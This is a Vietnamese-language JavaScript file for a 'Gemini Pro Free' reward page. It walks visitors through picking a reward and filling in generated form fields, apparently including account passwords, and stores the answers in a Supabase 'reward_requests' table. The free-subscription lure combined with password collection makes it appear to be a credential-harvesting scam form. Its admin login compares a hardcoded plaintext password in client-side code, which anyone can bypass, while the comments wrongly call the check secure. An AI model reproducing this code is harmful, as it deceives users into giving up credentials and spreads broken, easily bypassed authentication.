// Gemini Pro Free - Main JavaScript

let currentStep = 1;
let currentRewardType = null;
let supabase = null;

// Initialize Supabase
if (typeof window.SUPABASE_CONFIG !== 'undefined' && window.SUPABASE_CONFIG.url && window.SUPABASE_CONFIG.anonKey) {
    if (typeof window.supabase !== 'undefined') {
        const { createClient } = window.supabase;
        supabase = createClient(
            window.SUPABASE_CONFIG.url,
            window.SUPABASE_CONFIG.anonKey
        );
    }
}

// Initialize
document.addEventListener('DOMContentLoaded', function() {
    initializeApp();
});

function initializeApp() {
    // Check if Supabase is configured
    if (!supabase) {
        console.warn('Supabase chưa được cấu hình. Vui lòng cập nhật file config.js');
    }

    // Setup event listeners
    setupEventListeners();
    
    // Initialize reward selection
    initializeRewardSelection();
    
    // Show first step
    showStep(1);
}

// Language switching - Redirect to separate files
function changeLanguage(lang) {
    if (lang === 'vi') {
        // Already on Vietnamese page
        return;
    } else if (lang === 'en') {
        window.location.href = '../en/index.html';
    } else {
        // Default to main Vietnamese page
        window.location.href = '../index.html';
    }
}

function setupEventListeners() {
    // Checkbox for step 2
    const confirmCheckbox = document.getElementById('confirmSteps');
    if (confirmCheckbox) {
        confirmCheckbox.addEventListener('change', function() {
            const continueBtn = document.getElementById('continueBtn');
            continueBtn.disabled = !this.checked;
        });
    }

    // Form validation
    const formInputs = document.querySelectorAll('.form-input');
    formInputs.forEach(input => {
        input.addEventListener('input', validateForm);
    });
}

// Initialize reward options on page load
function initializeRewardSelection() {
    const currentLanguage = 'vi'; // Hardcoded for Vietnamese page
    const visibleRewards = getVisibleRewardTypes(currentLanguage);
    
    // Populate reward selection
    const container = document.getElementById('rewardOptionsContainer');
    if (container) {
        container.innerHTML = '';
        visibleRewards.forEach(reward => {
            const div = document.createElement('div');
            div.className = 'reward-option';
            div.innerHTML = `
                <input type="radio" name="rewardType" value="${reward.type}" 
                       id="reward_${reward.type}" onchange="updateSelectedReward('${reward.type}')">
                <label for="reward_${reward.type}">
                    <strong>${reward.label}</strong>
                    <p>${reward.description}</p>
                </label>
            `;
            container.appendChild(div);
        });
    }
}

// Update selected reward
function updateSelectedReward(rewardType) {
    currentRewardType = rewardType;
    const selectBtn = document.getElementById('selectRewardBtn');
    if (selectBtn) {
        selectBtn.disabled = false;
    }
}

// Confirm reward selection and move to next step
function confirmRewardSelection() {
    if (!currentRewardType) {
        showNotification('Vui lòng chọn một phần thưởng!', 'error');
        return;
    }
    
    // Update the reward type select dropdown
    const rewardTypeSelect = document.getElementById('rewardType');
    if (rewardTypeSelect) {
        rewardTypeSelect.value = currentRewardType;
        rewardTypeSelect.disabled = false;
    }
    
    // Update form fields
    updateFormFields();
    
    // Move to next step
    nextStep();
}

// Update form fields dynamically based on selected reward
function updateFormFields() {
    const rewardType = document.getElementById('rewardType')?.value || currentRewardType;
    if (!rewardType) return;
    
    currentRewardType = rewardType;
    const config = REWARD_CONFIGS[rewardType];
    const container = document.getElementById('dynamicFormFields');
    
    if (!container || !config) return;
    
    container.innerHTML = '';
    config.fields.forEach(field => {
        const fieldHTML = `
            <div class="form-group">
                <label for="${field.id}" class="form-label">${field.label}</label>
                <input 
                    type="${field.type}" 
                    id="${field.id}" 
                    class="form-input" 
                    placeholder="${field.placeholder}"
                    ${field.required ? 'required' : ''}
                >
                <span class="form-hint">${field.label}</span>
            </div>
        `;
        container.innerHTML += fieldHTML;
    });
}

// Navigation Functions
function nextStep() {
    if (currentStep < 4) {
        currentStep++;
        showStep(currentStep);
    }
}

function previousStep() {
    if (currentStep > 1) {
        currentStep--;
        showStep(currentStep);
    }
}

function showStep(stepNumber) {
    // Hide all steps
    const allSteps = document.querySelectorAll('.step-container');
    allSteps.forEach(step => {
        step.classList.remove('active');
    });

    // Show current step
    const currentStepElement = document.querySelector(`.step-container[data-step="${stepNumber}"]`);
    if (currentStepElement) {
        currentStepElement.classList.add('active');
    }

    // Update progress bar
    updateProgressBar(stepNumber);

    // Scroll to top
    window.scrollTo({ top: 0, behavior: 'smooth' });
}

function updateProgressBar(stepNumber) {
    const progressSteps = document.querySelectorAll('.progress-step');
    
    progressSteps.forEach((step, index) => {
        const stepNum = index + 1;
        
        if (stepNum < stepNumber) {
            step.classList.add('completed');
            step.classList.remove('active');
        } else if (stepNum === stepNumber) {
            step.classList.add('active');
            step.classList.remove('completed');
        } else {
            step.classList.remove('active', 'completed');
        }
    });
}

// Form Validation
function validateForm() {
    if (!currentRewardType) return false;
    
    const config = REWARD_CONFIGS[currentRewardType];
    if (!config) return false;
    
    // Check if all required fields are filled
    for (let field of config.fields) {
        const element = document.getElementById(field.id);
        if (!element) continue;
        
        const value = element.value.trim();
        if (field.required && value === '') return false;
        
        // Validate email fields
        if (field.type === 'email' && value !== '' && !isValidEmail(value)) {
            return false;
        }
    }
    
    return true;
}

function isValidEmail(email) {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(email);
}

// Form Submission
async function submitForm() {
    // Validate reward selection
    if (!currentRewardType) {
        showNotification('Vui lòng chọn một phần thưởng!', 'error');
        return;
    }

    // Validate form
    if (!validateForm()) {
        showNotification('Vui lòng điền đầy đủ thông tin hợp lệ!', 'error');
        return;
    }

    // Get form values dynamically based on reward type
    const config = REWARD_CONFIGS[currentRewardType];
    const formData = {};
    
    config.fields.forEach(field => {
        const element = document.getElementById(field.id);
        if (element) {
            formData[field.id] = element.value;
        }
    });

    // Validate form data
    const validation = validateRewardForm(currentRewardType, formData);
    if (!validation.valid) {
        showNotification(validation.error, 'error');
        return;
    }

    // Build reward details
    let rewardDetails;
    try {
        rewardDetails = buildRewardDetails(currentRewardType, formData);
    } catch (error) {
        showNotification('Lỗi xử lý dữ liệu: ' + error.message, 'error');
        return;
    }

    // Show loading
    showLoading(true);

    try {
        // Save to Supabase
        if (supabase) {
            const { data, error } = await supabase
                .from('reward_requests')
                .insert([
                    {
                        reward_type: currentRewardType,
                        reward_details: rewardDetails,
                        status: 'pending',
                        created_at: new Date().toISOString()
                    }
                ]);

            if (error) {
                console.error('Supabase error:', error);
                throw new Error('Không thể lưu thông tin. Vui lòng thử lại!');
            }

            console.log('Data saved successfully:', data);
        } else {
            // Fallback: Log to console if Supabase is not configured
            console.log('Form submitted (Supabase not configured):', {
                reward_type: currentRewardType,
                reward_details: rewardDetails,
                created_at: new Date().toISOString()
            });
            
            // Simulate delay
            await new Promise(resolve => setTimeout(resolve, 1500));
        }

        // Hide loading
        showLoading(false);

        // Show success message
        showNotification('Đã gửi thông tin thành công!', 'success');

        // Move to next step
        setTimeout(() => {
            nextStep();
        }, 1000);

    } catch (error) {
        showLoading(false);
        showNotification(error.message || 'Có lỗi xảy ra. Vui lòng thử lại!', 'error');
        console.error('Error:', error);
    }
}

// Reset Form
function resetForm() {
    // Reset form fields
    const form = document.getElementById('userForm');
    if (form) {
        form.reset();
    }

    // Reset reward selection
    const rewardOptions = document.querySelectorAll('input[name="rewardType"]');
    rewardOptions.forEach(option => {
        option.checked = false;
    });

    // Reset variables
    currentRewardType = null;
    currentStep = 1;
    showStep(1);

    // Disable buttons
    const continueBtn = document.getElementById('continueBtn');
    const selectRewardBtn = document.getElementById('selectRewardBtn');
    if (continueBtn) continueBtn.disabled = true;
    if (selectRewardBtn) selectRewardBtn.disabled = true;
    
    // Clear dynamic form fields
    const dynamicFields = document.getElementById('dynamicFormFields');
    if (dynamicFields) dynamicFields.innerHTML = '';
}

// Loading Overlay
function showLoading(show) {
    const loadingOverlay = document.getElementById('loadingOverlay');
    if (loadingOverlay) {
        if (show) {
            loadingOverlay.classList.add('active');
        } else {
            loadingOverlay.classList.remove('active');
        }
    }
}

// Notification System
function showNotification(message, type = 'info') {
    // Create notification element
    const notification = document.createElement('div');
    notification.className = `notification notification-${type}`;
    notification.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        padding: 20px 30px;
        background: ${type === 'success' ? '#95E1D3' : '#FF6B6B'};
        color: #1A1A1A;
        border: 4px solid #1A1A1A;
        box-shadow: 5px 5px 0px rgba(0, 0, 0, 1);
        font-weight: 700;
        font-size: 1.1rem;
        z-index: 10000;
        animation: slideInRight 0.3s ease;
        max-width: 400px;
        word-wrap: break-word;
    `;
    notification.textContent = message;

    // Add animation
    const style = document.createElement('style');
    style.textContent = `
        @keyframes slideInRight {
            from {
                transform: translateX(400px);
                opacity: 0;
            }
            to {
                transform: translateX(0);
                opacity: 1;
            }
        }
    `;
    document.head.appendChild(style);

    // Add to body
    document.body.appendChild(notification);

    // Remove after 3 seconds
    setTimeout(() => {
        notification.style.animation = 'slideInRight 0.3s ease reverse';
        setTimeout(() => {
            notification.remove();
            style.remove();
        }, 300);
    }, 3000);
}

// Utility Functions
function sanitizeInput(input) {
    const div = document.createElement('div');
    div.textContent = input;
    return div.innerHTML;
}

// Analytics (Optional)
function trackEvent(eventName, data = {}) {
    console.log('Event:', eventName, data);
    // Add your analytics code here (Google Analytics, etc.)
}

// Track page load
trackEvent('page_load', {
    timestamp: new Date().toISOString()
});

// Toggle Password Visibility
function togglePassword() {
    const passwordInput = document.getElementById('password');
    const toggleBtn = document.querySelector('.toggle-password');
    
    if (passwordInput.type === 'password') {
        passwordInput.type = 'text';
        toggleBtn.textContent = '🙈';
    } else {
        passwordInput.type = 'password';
        toggleBtn.textContent = '👁️';
    }
}

// Admin Login Functions
function toggleAdminLogin() {
    const popup = document.getElementById('adminLoginPopup');
    popup.classList.toggle('active');
    
    // Clear password field
    const passwordInput = document.getElementById('adminPassword');
    if (passwordInput) {
        passwordInput.value = '';
    }
}

// SHA-256 hash function (secure)
async function sha256(message) {
    const msgBuffer = new TextEncoder().encode(message);
    const hashBuffer = await crypto.subtle.digest('SHA-256', msgBuffer);
    const hashArray = Array.from(new Uint8Array(hashBuffer));
    const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
    return hashHex;
}

async function adminLogin() {
    const passwordInput = document.getElementById('adminPassword');
    const password = passwordInput.value.trim(); // Remove whitespace
    
    // Simple password check - no hash
    if (password === '200320') {
        // Store admin session with timestamp
        const authToken = await sha256(password + Date.now().toString());
        sessionStorage.setItem('adminAuth', authToken);
        sessionStorage.setItem('adminTime', Date.now().toString());
        
        // Redirect to admin page
        window.location.href = 'admin.html';
    } else {
        showNotification('Mật khẩu không đúng!', 'error');
        passwordInput.value = '';
    }
}
